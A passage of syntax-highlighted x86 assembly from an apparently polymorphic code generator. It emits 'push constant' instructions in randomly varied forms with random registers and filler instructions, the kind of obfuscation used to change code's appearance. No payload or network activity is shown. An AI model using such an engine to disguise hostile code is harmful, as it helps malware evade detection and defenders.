                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                   </span><span class="sc5">jl_</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
                   </span><span class="sc5">jg_</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                   </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">@@3</span><span class="sc0">
                   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">     </span><span class="sc1">; lea EAX,[EAX]</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                   </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">@@4</span><span class="sc0">
                   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
              </span><span class="sc5">@@4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                   </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">@@5</span><span class="sc0">
                   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
              </span><span class="sc5">@@5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                   </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">@@6</span><span class="sc0">
                   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
              </span><span class="sc5">@@6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                   </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">@@3</span><span class="sc0">
                   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
                   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
              </span><span class="sc5">@@3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">opCode_eRg1</span><span class="sc4">&amp;</span><span class="sc5">eRg2</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                   </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">@@7</span><span class="sc0">
                   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">     </span><span class="sc1">; lea EAX,[EAX]</span><span class="sc0">
              </span><span class="sc5">@@7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                   </span><span class="sc5">jl_</span><span class="sc0"> </span><span class="sc5">@@2</span><span class="sc0">
                   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">
                   </span><span class="sc6">stosb</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">cld</span><span class="sc0">
                   </span><span class="sc6">stosw</span><span class="sc0">
                   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">case2</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenRegF</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04840h</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                   </span><span class="sc5">@@@1</span><span class="sc4">:</span><span class="sc0">
                   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@@1</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">
                   </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">ERts</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; in</span><span class="sc0">
</span><span class="sc1">; cl=eRg1#</span><span class="sc0">
</span><span class="sc1">; ch=eRg2#</span><span class="sc0">
</span><span class="sc1">; out</span><span class="sc0">
</span><span class="sc1">; al=opCode eRg1&amp;eRg2</span><span class="sc0">
</span><span class="sc5">opCode_eRg1</span><span class="sc4">&amp;</span><span class="sc5">eRg2</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
                 </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; esi = 0xXXXXXXXX</span><span class="sc0">
</span><span class="sc1">; edi = Dest</span><span class="sc0">
</span><span class="sc1">; ecx = Metod# (0..4)</span><span class="sc0">
</span><span class="sc5">Metod</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">MakePush0xXXXXXXXX</span><span class="sc4">:</span><span class="sc0">
                   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000000000000000000000000000111B</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                   </span><span class="sc5">jl_</span><span class="sc0"> </span><span class="sc5">@g</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                 </span><span class="sc5">@g</span><span class="sc4">:</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@l1</span><span class="sc0">
              </span><span class="sc5">@l2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Metod1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@l2</span><span class="sc0">
                   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Metod2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@l2</span><span class="sc0">
                   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Metod3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@l2</span><span class="sc0">
                   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Metod4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@l2</span><span class="sc0">
                   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Metod4b</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@l2</span><span class="sc0">
              </span><span class="sc5">@l1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                  </span><span class="sc1">;mov ecx,Metod</span><span class="sc0">
                   </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Metod1</span><span class="sc4">:</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc0">    </span><span class="sc1">;  push 0xXXXXXXXX</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">stosb</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">stosd</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Metod2</span><span class="sc4">:</span><span class="sc0">
                                   </span><span class="sc1">;    mov eRg,0xXXXXXXXX</span><span class="sc0">
                  </span><span class="sc1">; call GenReg     ;    push eRg</span><span class="sc0">
                  </span><span class="sc1">; call MakeMOVeRg0xXXXXXXXX</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Opt2</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNops</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MakePush_eRg</span><span class="sc0">
                   </span><span class="sc6">ret</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Metod3</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;call GenReg</span><span class="sc0">
                   </span><span class="sc1">;call MakeMOVeRg0xXXXXXXXX</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Opt2</span><span class="sc0">
                   </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; Reg#*8</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenReg</span><span class="sc0">
                   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C087h</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">
                   </span><span class="sc6">stosw</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNops</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MakePush_eRg</span><span class="sc0">
                   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Rand0xFF</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">
                 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Opt1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rand0xFF</span><span class="sc0">
                 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Opt2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenReg</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MakeMOVeRg0xXXXXXXXX</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNops</span><span class="sc0">
                 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Opt3</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">
                   </span><span class="sc6">stosw</span><span class="sc0">
                   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">
                   </span><span class="sc6">stosb</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenNops</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MakePush_eRg</span><span class="sc0">
                   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Metod4</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Opt1</span><span class="sc0">
                   </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Opt2</span><span class="sc0">

                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C0C1h</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Opt3</span><span class="sc0">
                   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Metod4b</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Opt1</span><span class="sc0">
                   </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Opt2</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C8C1h</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Opt3</span><span class="sc0">
                   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------</span><span class="sc0">

</span><span class="sc5">GenRegF</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">RandEAX</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GenReg</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">; out  al=Reg#</span><span class="sc0">
</span><span class="sc5">@L</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GenRegF</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@L</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MakeMOVeRg0xXXXXXXXX</span><span class="sc4">:</span><span class="sc0">
                   </span><span class="sc1">; input  al=Reg# (0..7)</span><span class="sc0">
                   </span><span class="sc1">;        edi=Dest</span><span class="sc0">
                   </span><span class="sc1">;   out  dl=Reg#</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">stosb</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">stosd</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MakePush_eRg</span><span class="sc4">:</span><span class="sc0">
                   </span><span class="sc1">; input dl=Reg# (0..7)</span><span class="sc0">
                   </span><span class="sc1">;      edi=Dest</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">cld</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">stosb</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MakePush0xXXXXXXXXEnd</span><span class="sc4">:</span><span class="sc0">
</span></div></body>
</html>
